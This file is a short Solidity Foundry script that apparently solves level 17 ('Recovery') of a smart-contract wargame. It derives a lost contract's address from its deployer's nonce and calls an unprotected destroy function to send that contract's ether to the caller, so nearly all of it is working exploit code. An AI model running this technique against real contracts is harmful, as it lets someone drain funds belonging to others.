// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {HelperFunctions} from "script/HelperFunctions.s.sol";

// ================================================================
// │                       LEVEL 17 - RECOVERY                    │
// ================================================================
interface ISimpleToken {
    function destroy(address payable _to) external;
}

contract Exploit is Script, HelperFunctions {
    function run() public {
        address targetContractAddress = getInstanceAddress();

        vm.startBroadcast();
        // The first contract deployed will have a nonce of 1
        uint256 nonce = 1;

        // Find the address of the first contract deployed
        address firstContractAddress = address(
            uint160(
                uint256(
                    keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), targetContractAddress, bytes1(uint8(nonce))))
                )
            )
        );

        // Call destroy on the target contract
        ISimpleToken(firstContractAddress).destroy(payable(msg.sender));
        vm.stopBroadcast();
    }
}
